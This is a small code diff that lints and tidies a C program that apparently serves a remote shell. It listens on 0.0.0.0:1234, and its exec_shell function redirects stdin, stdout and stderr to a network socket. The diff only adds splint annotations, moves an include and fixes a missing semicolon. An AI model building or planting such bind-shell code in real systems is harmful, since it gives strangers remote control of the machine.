@@ -1,5 +1,8 @@
+/*@-skipposixheaders@*/
+#ifndef S_SPLINT_S
 #include <sys/types.h> 
 #include <sys/socket.h>
+#include <sys/wait.h>
 #include <netinet/in.h>
 #include <arpa/inet.h> 
 #include <assert.h>
@@ -7,10 +10,10 @@
 #include <fcntl.h>
 #include <unistd.h>
 #include <signal.h>
-#include <sys/wait.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
+#endif
 
 #define PORT 1234
 #define ADDR "0.0.0.0"
@@ -30,7 +33,7 @@ int exec_shell( int sock )
   close(2); 
 
   if( dup(sock) != 0 || dup(sock) != 1 || dup(sock) != 2 ) {
-  	perror("dup not duped")
+    perror("dup not duped");
     exit(1);
   }
 
